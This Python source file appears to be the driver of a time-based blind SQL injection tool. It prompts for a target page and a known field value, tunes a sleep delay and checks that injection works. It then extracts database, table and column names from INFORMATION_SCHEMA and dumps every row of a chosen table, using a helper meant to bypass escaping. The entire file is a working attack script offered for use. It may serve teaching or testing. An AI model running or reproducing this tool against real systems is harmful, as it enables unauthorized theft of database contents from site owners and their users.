import requests
import string
import sys

from attack_info_class import *
from getdb_util import *
from getdb_injection_util import *
from my_request import *

#MODULO 1: INPUTS MANAGING 
print("\nWELCOME!!!\n")
site = input("Enter the page you want to attack (Url without request in case of GET / Complete Url in case of POST): ")
print("\n")
field = input("Enter the field name of the known value by which you want to attack: ")
print("\n")
known_value = input("Enter the known value: ")
print("\n")

check_method = False
while(not check_method):
	method = input("Write g if the php method is GET\nWrite p if the php method is POST\n>>>")
	if(method=='g'):
		method='GET'
		check_method = True
	elif(method=='p'):
		method='POST'
		check_method = True
	else:
		print("Not valid input. Try again g or p!")

my_attack = Attack_info(site, field, known_value, method)

#MODULO 2: SLEEP TIME OPTIMIZATION
my_attack.set_sleep_time(compute_sleep_time(my_attack))
print("\nSLEEP TIME OPTIMIZED ---> %g s" % my_attack.sleep_time)

check_time=False
while(not check_time):
	custom_time_input=input("Insert a number (float<<30.0s) to change the SLEEP TIME or n to go on with the optimized one [float/n]:\n>>>")
	if(custom_time_input=="n"):
		check_time=True
	elif(float(custom_time_input) < 30 and float(custom_time_input) > 0):
		my_attack.set_sleep_time(float(custom_time_input))
		check_time=True

#SHOW_PAYLOAD
show_payload_tmp = input("\nDo you want to see all payload from now? [y/n]:\t")
if(show_payload_tmp == 'y'):
	my_attack.set_show_payload(True)
else:
	my_attack.set_show_payload(False)

#MODULO 3: CHECK IF INJECTION WORKS
if(not injection_test(my_attack)):
	print("I'm sorry, injection does not work!!!")
	sys.exit(0)

###########
# ATTACCO #
###########

printable_ascii = list(string.printable)
for i in range(len(printable_ascii)):
	printable_ascii[i] = ord(printable_ascii[i])
printable_ascii.sort()

#EXTRACTING DATABASE NAMES FROM SCHEMATA
query_schemata_num_row = "SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA"

schemata_num_row = find_num_row(my_attack, query_schemata_num_row)
print("Number of Database in the schema: %d\n" % schemata_num_row)

query_schema_names = "SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA"

db_found_names_list = get_values( my_attack, printable_ascii, schemata_num_row, query_schema_names )

choose_db_text = "Choose the Database you want to extract values from (Insert the number):\n"
choice = choice_menu( choose_db_text, db_found_names_list)
schema_name = db_found_names_list[int(choice)]
print("You chose to extract information from '%s' schema!\n" % schema_name)
custom_text = input("If you assume the word is incorrect or if |_| is present in the found word, please enter an hypothetical CORRECT name!\nOtherwise press ENTER:\n>>>")
if(not custom_text==""):
	schema_name=custom_text	

#EXTRACTING TABLE NAMES FROM THE SELECTED DATABASE
query_tab_num_row = "SELECT COUNT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = %s" % bypass_escape(schema_name)

tables_num_row = find_num_row(my_attack, query_tab_num_row)
print("Number of Tables in the schema: %d\n" % tables_num_row)

query_tab_names = "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = %s" % bypass_escape(schema_name)

tab_found_names_list = get_values( my_attack, printable_ascii, tables_num_row, query_tab_names )

choose_tab_text = "Choose the Table you want to extract values from (Insert the number):\n"
choice = choice_menu( choose_tab_text, tab_found_names_list)
table_name = tab_found_names_list[int(choice)]
print("You chose to extract information from '%s' table!\n" % table_name)
custom_text = input("If you assume the word is incorrect or if |_| is present in the found word, please enter an hypothetical CORRECT name!\nOtherwise press ENTER:\n>>>")
if(not custom_text==""):
	table_name=custom_text	

#EXTRACTING COLUMN NAMES FROM THE SELECTED TABLE
query_col_num_row = "SELECT COUNT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = %s" % bypass_escape(table_name)

col_num_row = find_num_row(my_attack, query_col_num_row)
print("Number of Columns in the table: %d\n" % col_num_row)

query_col_names = "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = %s" % bypass_escape(table_name)

col_found_names_list = get_values( my_attack, printable_ascii, col_num_row, query_col_names )
print(col_found_names_list)
print("")

#NUMBER OF ROWS IN THE SELECTED TABLE
query_num_row = "SELECT COUNT(*) FROM %s" % table_name
num_row = find_num_row(my_attack, query_num_row)
print("Number of Tuples in the table: %d\n" % num_row)

#FINAL ATTACK
final_list = []
for i in range(len(col_found_names_list)):
	query = "SELECT %s FROM %s" % ( col_found_names_list[i] , table_name )
	final_list.append(get_values(my_attack,printable_ascii,num_row,query))

for i in range(num_row):
	row="[\t"
	for j in range(len(final_list)):
		row = row + "|"
		row = row + final_list[j][i] + "\t"
	row = row + "]"
	print(row + "\n")
